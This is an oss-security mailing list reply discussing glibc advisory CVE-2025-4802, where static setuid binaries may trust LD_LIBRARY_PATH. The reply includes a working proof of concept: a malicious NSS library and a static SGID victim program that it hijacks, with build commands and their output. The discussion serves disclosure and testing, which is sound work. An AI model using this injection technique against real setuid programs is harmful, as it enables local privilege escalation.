Received: (qmail 7505 invoked by uid 550); 17 May 2025 06:00:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 3978 invoked from network); 17 May 2025 05:59:27 -0000
Date: Sat, 17 May 2025 07:59:14 +0200
From: Solar Designer <solar@openwall.com>
To: Carlos O'Donell <carlos@redhat.com>
Cc: oss-security@lists.openwall.com
Message-ID: <20250517055914.GA24860@openwall.com>
References: <3ac997b0-28a5-4129-af53-675efe4c2dec@redhat.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <3ac997b0-28a5-4129-af53-675efe4c2dec@redhat.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] The GNU C Library security advisories update for 2025-05-16

On Fri, May 16, 2025 at 03:41:11PM -0400, Carlos O'Donell wrote:
> The following security advisories have been published:
> 
> GLIBC-SA-2025-0002:
> ===================
> elf: static setuid binary dlopen may incorrectly search LD_LIBRARY_PATH 
> (CVE-2025-4802)
> 
> A statically linked setuid binary that calls dlopen (including internal
> dlopen calls after setlocale or calls to NSS functions such as getaddrinfo)
> may incorrectly search LD_LIBRARY_PATH to determine which library to load,
> leading to the execution of library code that is attacker controlled.
> 
> The only viable vector for exploitation of this bug is local, if a static
> setuid program exists, and that program calls dlopen, then it may search
> LD_LIBRARY_PATH to locate the SONAME to load. No such program has been
> discovered at the time of publishing this advisory, but the presence of
> custom setuid programs, although strongly discouraged as a security
> practice, cannot be discounted.
> 
> Notes:
> ======
> 
> Published advisories are available directly in the project git repository:
> https://sourceware.org/cgit/glibc/tree/advisories

Thank you very much for handling this disclosure!

The advisory file that you committed to the glibc repo also helpfully
includes info on when the bug was introduced/exposed and when it was
fixed.  The two referenced commits are from 2017 and 2023, respectively.

CVE-id: CVE-2025-4802
Public-Date: 2025-05-16
Vulnerable-Commit: 10e93d968716ab82931d593bada121c17c0a4b93 (2.27)
Fix-Commit: 5451fa962cd0a90a0e2ec1d8910a559ace02bba0 (2.39)

Here's a testcase I've just created:

$ cat attack.c
#include <nss.h>
#include <stdio.h>
enum nss_status _nss_myhostname_endhostent(void)
{
	puts("intercepted");
	return NSS_STATUS_SUCCESS;
}
$ gcc attack.c -o libnss_myhostname.so.2 -O2 -Wall --shared -fPIC
$ cat victim.c
#include <netdb.h>
int main(void)
{
	sethostent(0);
	endhostent();
	return 0;
}
$ gcc victim.c -o victim -O2 -s -Wall -static
/usr/bin/ld: /tmp/cc1VyzAE.o: in function `main':
victim.c:(.text.startup+0x7): warning: Using 'sethostent' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
/usr/bin/ld: victim.c:(.text.startup+0xc): warning: Using 'endhostent' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
$ LD_LIBRARY_PATH=. ./victim
intercepted
$ id
uid=1000(user) gid=1000(user) groups=1000(user),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
$ chgrp wheel victim
$ chmod g+s victim
$ LD_LIBRARY_PATH=. ./victim
intercepted

The second time this printed "intercepted" indicates vulnerability: the
program was SGID to a different group, so LD_LIBRARY_PATH shouldn't have
been trusted.

The above test was on Rocky Linux 9.5 with
glibc-static-2.34-125.el9_5.8.x86_64, to install which I had to enable
the "devel" repo (which is normally disabled).

# dnf install glibc-static
Rocky Linux 9 - Devel WARNING! FOR BUILDROOT ONLY DO NOT LEAVE ENABLED

So building of static binaries against glibc is quite discouraged at
least on this distro.

Anyway, re-running the above tests on another system with Rocky Linux
9.5 but the SIG/Security glibc-2.34-125.1.el9_5.security.0.11.x86_64
does not print "intercepted" the second time, which is consistent with
my code review - indeed, glibc-owl-alt-sanitize-env.patch hardens those
env var uses in dl-support.c, which the upstream fix from 2023 (_not_
backported to this glibc yet) does differently.  Unfortunately, none of
this helps much yet, because vulnerable programs (if any) would likely
have been built by third-parties on other systems.

Notably, Go produces static binaries, and I guess would include glibc
from its own build?  Do they also use any of the affected functions?
Searching around shows people building Go programs complain about the
glibc "warning: Using 'getaddrinfo' in statically linked applications
requires at runtime the shared libraries from the glibc version used for
linking" (and ditto for some other functions), but only a subset (maybe
none?) of those programs would be installed SUID/SGID/setcaps.  Are we
aware of any?

Alexander
